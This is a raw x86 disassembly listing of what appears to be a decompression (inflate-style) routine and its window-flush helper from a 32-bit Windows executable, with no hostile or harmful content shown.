  4083ca:	0f b7 0c 4d c4 c0 40 	movzwl 0x40c0c4(,%ecx,2),%ecx
  4083d1:	00 
  4083d2:	8b 43 08             	mov    0x8(%ebx),%eax
  4083d5:	23 cf                	and    %edi,%ecx
  4083d7:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4083da:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4083de:	89 44 24 30          	mov    %eax,0x30(%esp)
  4083e2:	2b f1                	sub    %ecx,%esi
  4083e4:	0f b6 00             	movzbl (%eax),%eax
  4083e7:	d3 ef                	shr    %cl,%edi
  4083e9:	89 74 24 24          	mov    %esi,0x24(%esp)
  4083ed:	a8 10                	test   $0x10,%al
  4083ef:	74 1e                	je     0x40840f
  4083f1:	6a 0f                	push   $0xf
  4083f3:	59                   	pop    %ecx
  4083f4:	23 c1                	and    %ecx,%eax
  4083f6:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4083fa:	89 43 08             	mov    %eax,0x8(%ebx)
  4083fd:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  408401:	89 43 0c             	mov    %eax,0xc(%ebx)
  408404:	c7 03 04 00 00 00    	movl   $0x4,(%ebx)
  40840a:	e9 fc f8 ff ff       	jmp    0x407d0b
  40840f:	a8 40                	test   $0x40,%al
  408411:	0f 85 b5 03 00 00    	jne    0x4087cc
  408417:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40841b:	e9 fb fe ff ff       	jmp    0x40831b
  408420:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408424:	eb 25                	jmp    0x40844b
  408426:	85 c0                	test   %eax,%eax
  408428:	0f 84 27 03 00 00    	je     0x408755
  40842e:	48                   	dec    %eax
  40842f:	8b ce                	mov    %esi,%ecx
  408431:	89 44 24 10          	mov    %eax,0x10(%esp)
  408435:	8b 44 24 14          	mov    0x14(%esp),%eax
  408439:	0f b6 00             	movzbl (%eax),%eax
  40843c:	d3 e0                	shl    %cl,%eax
  40843e:	0b f8                	or     %eax,%edi
  408440:	ff 44 24 14          	incl   0x14(%esp)
  408444:	8b 44 24 10          	mov    0x10(%esp),%eax
  408448:	83 c6 08             	add    $0x8,%esi
  40844b:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40844e:	3b f1                	cmp    %ecx,%esi
  408450:	72 d4                	jb     0x408426
  408452:	0f b7 04 4d c4 c0 40 	movzwl 0x40c0c4(,%ecx,2),%eax
  408459:	00 
  40845a:	23 c7                	and    %edi,%eax
  40845c:	d3 ef                	shr    %cl,%edi
  40845e:	01 43 0c             	add    %eax,0xc(%ebx)
  408461:	2b f1                	sub    %ecx,%esi
  408463:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  408467:	89 74 24 24          	mov    %esi,0x24(%esp)
  40846b:	c7 03 05 00 00 00    	movl   $0x5,(%ebx)
  408471:	8b c1                	mov    %ecx,%eax
  408473:	2b c3                	sub    %ebx,%eax
  408475:	2d a0 1b 00 00       	sub    $0x1ba0,%eax
  40847a:	3b 43 0c             	cmp    0xc(%ebx),%eax
  40847d:	73 14                	jae    0x408493
  40847f:	8b 44 24 20          	mov    0x20(%esp),%eax
  408483:	8b 00                	mov    (%eax),%eax
  408485:	2b 43 0c             	sub    0xc(%ebx),%eax
  408488:	2b c3                	sub    %ebx,%eax
  40848a:	05 60 e4 ff ff       	add    $0xffffe460,%eax
  40848f:	03 c1                	add    %ecx,%eax
  408491:	eb 05                	jmp    0x408498
  408493:	8b c1                	mov    %ecx,%eax
  408495:	2b 43 0c             	sub    0xc(%ebx),%eax
  408498:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  40849c:	89 44 24 28          	mov    %eax,0x28(%esp)
  4084a0:	0f 84 da 00 00 00    	je     0x408580
  4084a6:	8d 83 a0 1b 00 00    	lea    0x1ba0(%ebx),%eax
  4084ac:	85 ed                	test   %ebp,%ebp
  4084ae:	0f 85 92 00 00 00    	jne    0x408546
  4084b4:	8b 54 24 20          	mov    0x20(%esp),%edx
  4084b8:	3b 0a                	cmp    (%edx),%ecx
  4084ba:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  4084be:	75 22                	jne    0x4084e2
  4084c0:	39 83 a4 9b 00 00    	cmp    %eax,0x9ba4(%ebx)
  4084c6:	74 1a                	je     0x4084e2
  4084c8:	8b ab a4 9b 00 00    	mov    0x9ba4(%ebx),%ebp
  4084ce:	8b c8                	mov    %eax,%ecx
  4084d0:	3b c5                	cmp    %ebp,%eax
  4084d2:	73 05                	jae    0x4084d9
  4084d4:	2b e8                	sub    %eax,%ebp
  4084d6:	4d                   	dec    %ebp
  4084d7:	eb 09                	jmp    0x4084e2
  4084d9:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4084dd:	8b 6d 00             	mov    0x0(%ebp),%ebp
  4084e0:	2b e8                	sub    %eax,%ebp
  4084e2:	85 ed                	test   %ebp,%ebp
  4084e4:	75 60                	jne    0x408546
  4084e6:	52                   	push   %edx
  4084e7:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  4084ed:	e8 62 03 00 00       	call   0x408854
  4084f2:	8b 83 a8 9b 00 00    	mov    0x9ba8(%ebx),%eax
  4084f8:	8b 93 a4 9b 00 00    	mov    0x9ba4(%ebx),%edx
  4084fe:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  408502:	89 44 24 18          	mov    %eax,0x18(%esp)
  408506:	3b c2                	cmp    %edx,%eax
  408508:	73 07                	jae    0x408511
  40850a:	8b ea                	mov    %edx,%ebp
  40850c:	2b e8                	sub    %eax,%ebp
  40850e:	4d                   	dec    %ebp
  40850f:	eb 04                	jmp    0x408515
  408511:	8b 29                	mov    (%ecx),%ebp
  408513:	2b e8                	sub    %eax,%ebp
  408515:	3b 01                	cmp    (%ecx),%eax
  408517:	75 21                	jne    0x40853a
  408519:	8d 8b a0 1b 00 00    	lea    0x1ba0(%ebx),%ecx
  40851f:	3b d1                	cmp    %ecx,%edx
  408521:	74 17                	je     0x40853a
  408523:	8b c1                	mov    %ecx,%eax
  408525:	89 44 24 18          	mov    %eax,0x18(%esp)
  408529:	76 07                	jbe    0x408532
  40852b:	8b ea                	mov    %edx,%ebp
  40852d:	2b e9                	sub    %ecx,%ebp
  40852f:	4d                   	dec    %ebp
  408530:	eb 08                	jmp    0x40853a
  408532:	8b 54 24 20          	mov    0x20(%esp),%edx
  408536:	8b 2a                	mov    (%edx),%ebp
  408538:	2b e9                	sub    %ecx,%ebp
  40853a:	85 ed                	test   %ebp,%ebp
  40853c:	0f 84 2d 02 00 00    	je     0x40876f
  408542:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  408546:	8b 44 24 28          	mov    0x28(%esp),%eax
  40854a:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40854e:	8a 00                	mov    (%eax),%al
  408550:	88 01                	mov    %al,(%ecx)
  408552:	41                   	inc    %ecx
  408553:	8b 44 24 28          	mov    0x28(%esp),%eax
  408557:	40                   	inc    %eax
  408558:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40855c:	4d                   	dec    %ebp
  40855d:	89 44 24 28          	mov    %eax,0x28(%esp)
  408561:	3b 03                	cmp    (%ebx),%eax
  408563:	8b d0                	mov    %eax,%edx
  408565:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  408569:	8d 83 a0 1b 00 00    	lea    0x1ba0(%ebx),%eax
  40856f:	0f 44 d0             	cmove  %eax,%edx
  408572:	83 6b 04 01          	subl   $0x1,0x4(%ebx)
  408576:	89 54 24 28          	mov    %edx,0x28(%esp)
  40857a:	0f 85 2c ff ff ff    	jne    0x4084ac
  408580:	83 23 00             	andl   $0x0,(%ebx)
  408583:	e9 0c 01 00 00       	jmp    0x408694
  408588:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40858c:	85 ed                	test   %ebp,%ebp
  40858e:	0f 85 90 00 00 00    	jne    0x408624
  408594:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  408598:	3b 4d 00             	cmp    0x0(%ebp),%ecx
  40859b:	75 2a                	jne    0x4085c7
  40859d:	8b ab a4 9b 00 00    	mov    0x9ba4(%ebx),%ebp
  4085a3:	8d 83 a0 1b 00 00    	lea    0x1ba0(%ebx),%eax
  4085a9:	3b e8                	cmp    %eax,%ebp
  4085ab:	74 16                	je     0x4085c3
  4085ad:	8b c8                	mov    %eax,%ecx
  4085af:	76 05                	jbe    0x4085b6
  4085b1:	2b e8                	sub    %eax,%ebp
  4085b3:	4d                   	dec    %ebp
  4085b4:	eb 09                	jmp    0x4085bf
  4085b6:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4085ba:	8b 6d 00             	mov    0x0(%ebp),%ebp
  4085bd:	2b e8                	sub    %eax,%ebp
  4085bf:	85 ed                	test   %ebp,%ebp
  4085c1:	75 61                	jne    0x408624
  4085c3:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4085c7:	52                   	push   %edx
  4085c8:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  4085ce:	e8 81 02 00 00       	call   0x408854
  4085d3:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  4085d9:	8b 93 a4 9b 00 00    	mov    0x9ba4(%ebx),%edx
  4085df:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4085e3:	3b ca                	cmp    %edx,%ecx
  4085e5:	73 07                	jae    0x4085ee
  4085e7:	8b ea                	mov    %edx,%ebp
  4085e9:	2b e9                	sub    %ecx,%ebp
  4085eb:	4d                   	dec    %ebp
  4085ec:	eb 05                	jmp    0x4085f3
  4085ee:	8b 6d 00             	mov    0x0(%ebp),%ebp
  4085f1:	2b e9                	sub    %ecx,%ebp
  4085f3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4085f7:	3b 08                	cmp    (%eax),%ecx
  4085f9:	75 21                	jne    0x40861c
  4085fb:	8d 83 a0 1b 00 00    	lea    0x1ba0(%ebx),%eax
  408601:	3b d0                	cmp    %eax,%edx
  408603:	74 17                	je     0x40861c
  408605:	8b c8                	mov    %eax,%ecx
  408607:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40860b:	76 07                	jbe    0x408614
  40860d:	8b ea                	mov    %edx,%ebp
  40860f:	2b e8                	sub    %eax,%ebp
  408611:	4d                   	dec    %ebp
  408612:	eb 08                	jmp    0x40861c
  408614:	8b 54 24 20          	mov    0x20(%esp),%edx
  408618:	8b 2a                	mov    (%edx),%ebp
  40861a:	2b e8                	sub    %eax,%ebp
  40861c:	85 ed                	test   %ebp,%ebp
  40861e:	0f 84 69 01 00 00    	je     0x40878d
  408624:	8a 43 08             	mov    0x8(%ebx),%al
  408627:	88 01                	mov    %al,(%ecx)
  408629:	41                   	inc    %ecx
  40862a:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40862e:	4d                   	dec    %ebp
  40862f:	e9 4c ff ff ff       	jmp    0x408580
  408634:	6a 07                	push   $0x7
  408636:	5d                   	pop    %ebp
  408637:	3b f5                	cmp    %ebp,%esi
  408639:	76 10                	jbe    0x40864b
  40863b:	83 ee 08             	sub    $0x8,%esi
  40863e:	40                   	inc    %eax
  40863f:	ff 4c 24 14          	decl   0x14(%esp)
  408643:	89 74 24 24          	mov    %esi,0x24(%esp)
  408647:	89 44 24 10          	mov    %eax,0x10(%esp)
  40864b:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40864f:	52                   	push   %edx
  408650:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  408656:	e8 f9 01 00 00       	call   0x408854
  40865b:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  408661:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  408667:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40866b:	3b c8                	cmp    %eax,%ecx
  40866d:	0f 82 1a 01 00 00    	jb     0x40878d
  408673:	8b 54 24 20          	mov    0x20(%esp),%edx
  408677:	8b 2a                	mov    (%edx),%ebp
  408679:	2b e9                	sub    %ecx,%ebp
  40867b:	3b c8                	cmp    %eax,%ecx
  40867d:	0f 85 0a 01 00 00    	jne    0x40878d
  408683:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  408689:	89 03                	mov    %eax,(%ebx)
  40868b:	83 f8 08             	cmp    $0x8,%eax
  40868e:	0f 85 17 01 00 00    	jne    0x4087ab
  408694:	8b 44 24 10          	mov    0x10(%esp),%eax
  408698:	6a 0f                	push   $0xf
  40869a:	5a                   	pop    %edx
  40869b:	39 13                	cmp    %edx,(%ebx)
  40869d:	0f 86 e4 f4 ff ff    	jbe    0x407b87
  4086a3:	e9 28 01 00 00       	jmp    0x4087d0
  4086a8:	8b 44 24 18          	mov    0x18(%esp),%eax
  4086ac:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  4086b2:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  4086b8:	83 62 04 00          	andl   $0x0,0x4(%edx)
  4086bc:	89 0a                	mov    %ecx,(%edx)
  4086be:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4086c4:	52                   	push   %edx
  4086c5:	e8 8a 01 00 00       	call   0x408854
  4086ca:	33 c0                	xor    %eax,%eax
  4086cc:	e9 39 01 00 00       	jmp    0x40880a
  4086d1:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4086d5:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  4086db:	8b 74 24 10          	mov    0x10(%esp),%esi
  4086df:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  4086e5:	89 70 04             	mov    %esi,0x4(%eax)
  4086e8:	8b 74 24 14          	mov    0x14(%esp),%esi
  4086ec:	89 30                	mov    %esi,(%eax)
  4086ee:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  4086f4:	50                   	push   %eax
  4086f5:	eb ce                	jmp    0x4086c5
  4086f7:	8b 44 24 14          	mov    0x14(%esp),%eax
  4086fb:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  408701:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  408707:	83 62 04 00          	andl   $0x0,0x4(%edx)
  40870b:	89 02                	mov    %eax,(%edx)
  40870d:	89 8b a8 9b 00 00    	mov    %ecx,0x9ba8(%ebx)
  408713:	eb af                	jmp    0x4086c4
  408715:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  40871b:	8b 74 24 10          	mov    0x10(%esp),%esi
  40871f:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  408725:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  40872b:	89 72 04             	mov    %esi,0x4(%edx)
  40872e:	e9 bd 00 00 00       	jmp    0x4087f0
  408733:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408737:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  40873d:	8b 74 24 10          	mov    0x10(%esp),%esi
  408741:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  408747:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  40874d:	89 72 04             	mov    %esi,0x4(%edx)
  408750:	e9 94 00 00 00       	jmp    0x4087e9
  408755:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  40875a:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  408760:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  408766:	83 62 04 00          	andl   $0x0,0x4(%edx)
  40876a:	e9 81 00 00 00       	jmp    0x4087f0
  40876f:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408773:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  408778:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  40877e:	8b 74 24 10          	mov    0x10(%esp),%esi
  408782:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  408788:	89 72 04             	mov    %esi,0x4(%edx)
  40878b:	eb 67                	jmp    0x4087f4
  40878d:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408791:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  408796:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  40879c:	8b 74 24 10          	mov    0x10(%esp),%esi
  4087a0:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  4087a6:	89 72 04             	mov    %esi,0x4(%edx)
  4087a9:	eb 45                	jmp    0x4087f0
  4087ab:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  4087af:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  4087b5:	8b 74 24 10          	mov    0x10(%esp),%esi
  4087b9:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  4087bf:	89 72 04             	mov    %esi,0x4(%edx)
  4087c2:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  4087c9:	00 
  4087ca:	eb 24                	jmp    0x4087f0
  4087cc:	8b 44 24 10          	mov    0x10(%esp),%eax
  4087d0:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  4087d4:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  4087da:	89 bb 1c 05 00 00    	mov    %edi,0x51c(%ebx)
  4087e0:	89 b3 18 05 00 00    	mov    %esi,0x518(%ebx)
  4087e6:	89 42 04             	mov    %eax,0x4(%edx)
  4087e9:	83 c8 ff             	or     $0xffffffff,%eax
  4087ec:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4087f0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4087f4:	8b 74 24 14          	mov    0x14(%esp),%esi
  4087f8:	89 32                	mov    %esi,(%edx)
  4087fa:	52                   	push   %edx
  4087fb:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  408801:	e8 4e 00 00 00       	call   0x408854
  408806:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40880a:	5f                   	pop    %edi
  40880b:	5e                   	pop    %esi
  40880c:	5d                   	pop    %ebp
  40880d:	5b                   	pop    %ebx
  40880e:	83 c4 38             	add    $0x38,%esp
  408811:	c2 04 00             	ret    $0x4
  408814:	70 82                	jo     0x408798
  408816:	40                   	inc    %eax
  408817:	00 87 82 40 00 3f    	add    %al,0x3f004082(%edi)
  40881d:	83 40 00 98          	addl   $0xffffff98,0x0(%eax)
  408821:	83 40 00 20          	addl   $0x20,0x0(%eax)
  408825:	84 40 00             	test   %al,0x0(%eax)
  408828:	71 84                	jno    0x4087ae
  40882a:	40                   	inc    %eax
  40882b:	00 88 85 40 00 34    	add    %cl,0x34004085(%eax)
  408831:	86 40 00             	xchg   %al,0x0(%eax)
  408834:	90                   	nop
  408835:	7b 40                	jnp    0x408877
  408837:	00 2c 7d 40 00 8c 7d 	add    %ch,0x7d8c0040(,%edi,2)
  40883e:	40                   	inc    %eax
  40883f:	00 97 7e 40 00 05    	add    %dl,0x500407e(%edi)
  408845:	7f 40                	jg     0x408887
  408847:	00 cf                	add    %cl,%bh
  408849:	7f 40                	jg     0x40888b
  40884b:	00 d0                	add    %dl,%al
  40884d:	87 40 00             	xchg   %eax,0x0(%eax)
  408850:	4b                   	dec    %ebx
  408851:	86 40 00             	xchg   %al,0x0(%eax)
  408854:	53                   	push   %ebx
  408855:	56                   	push   %esi
  408856:	57                   	push   %edi
  408857:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40885b:	8b 9f b4 9b 00 00    	mov    0x9bb4(%edi),%ebx
  408861:	8b 8f b0 9b 00 00    	mov    0x9bb0(%edi),%ecx
  408867:	8b 57 08             	mov    0x8(%edi),%edx
  40886a:	8b 87 b8 9b 00 00    	mov    0x9bb8(%edi),%eax
  408870:	3b d8                	cmp    %eax,%ebx
  408872:	0f 46 c8             	cmovbe %eax,%ecx
  408875:	8b 47 0c             	mov    0xc(%edi),%eax
  408878:	2b cb                	sub    %ebx,%ecx
  40887a:	8b f0                	mov    %eax,%esi
  40887c:	3b c8                	cmp    %eax,%ecx
  40887e:	0f 42 f1             	cmovb  %ecx,%esi
  408881:	56                   	push   %esi
  408882:	53                   	push   %ebx
  408883:	2b c6                	sub    %esi,%eax
  408885:	52                   	push   %edx
  408886:	89 47 0c             	mov    %eax,0xc(%edi)
  408889:	e8 62 e6 ff ff       	call   0x406ef0
  40888e:	8b 57 08             	mov    0x8(%edi),%edx
  408891:	03 de                	add    %esi,%ebx
  408893:	03 d6                	add    %esi,%edx
  408895:	89 57 08             	mov    %edx,0x8(%edi)
  408898:	8b 8f b0 9b 00 00    	mov    0x9bb0(%edi),%ecx
  40889e:	3b d9                	cmp    %ecx,%ebx
  4088a0:	75 16                	jne    0x4088b8
  4088a2:	8d 9f b0 1b 00 00    	lea    0x1bb0(%edi),%ebx
  4088a8:	39 8f b8 9b 00 00    	cmp    %ecx,0x9bb8(%edi)
  4088ae:	75 ba                	jne    0x40886a
  4088b0:	89 9f b8 9b 00 00    	mov    %ebx,0x9bb8(%edi)
  4088b6:	eb b2                	jmp    0x40886a
  4088b8:	89 9f b4 9b 00 00    	mov    %ebx,0x9bb4(%edi)
  4088be:	5f                   	pop    %edi
  4088bf:	5e                   	pop    %esi
  4088c0:	5b                   	pop    %ebx
  4088c1:	c2 04 00             	ret    $0x4
  4088c4:	ff 25 8c 91 40 00    	jmp    *0x40918c
